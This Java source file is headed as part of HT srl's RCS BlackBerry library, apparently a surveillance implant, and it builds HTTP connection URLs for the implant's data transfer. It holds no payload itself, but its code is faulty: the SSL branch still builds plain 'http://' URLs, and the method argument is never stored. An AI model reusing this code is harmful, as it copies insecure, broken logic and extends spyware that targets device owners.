/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : HttpConnection.java
 * Created      : 26-apr-2010
 * *************************************************/
package blackberry.transfer;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class DirectTcpConnection.
 */
public final class CHttpConnection extends Connection {

    //#debug
    static Debug debug = new Debug("HttpConnection", DebugLevel.VERBOSE);

    public static final int METHOD_FIRST = 0;
    public static final int METHOD_DEVICE = 0;
    public static final int METHOD_NODEVICE = 1;
    public static final int METHOD_NULL = 2;
    public static final int METHOD_LAST = 2;
    
    private final String host;
    private final int port;
    private final boolean ssl;

    int timeout = 3 * 60 * 1000;

    int method;

    // Constructor
    /**
     * Instantiates a new direct tcp connection.
     * 
     * @param host_
     *            the host_
     * @param port_
     *            the port_
     * @param ssl_
     *            the ssl_
     * @param deviceside_
     *            the deviceside_
     */
    public CHttpConnection(final String host_, final int port_,
            final boolean ssl_, final int method_) {
        host = host_;
        port = port_;
        ssl = ssl_;

        if (ssl) {
            url = "http://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;

        } else {
            url = "http://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;
        }

        //#debug debug
        debug.trace("method: " + method);

        switch (method) {
        case METHOD_DEVICE:
            url += ";deviceside=true";
            break;
        case METHOD_NODEVICE:
            url += ";deviceside=false";
            break;
        case METHOD_NULL:
            break;
            
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#error(java.lang.String)
     */
    protected void error(final String string) {
        // #debug
        debug.error(string);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#isActive()
     */
    public synchronized boolean isActive() {
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#trace(java.lang.String)
     */
    protected void trace(final String string) {
        // #debug debug
        debug.trace(string);
    }
}
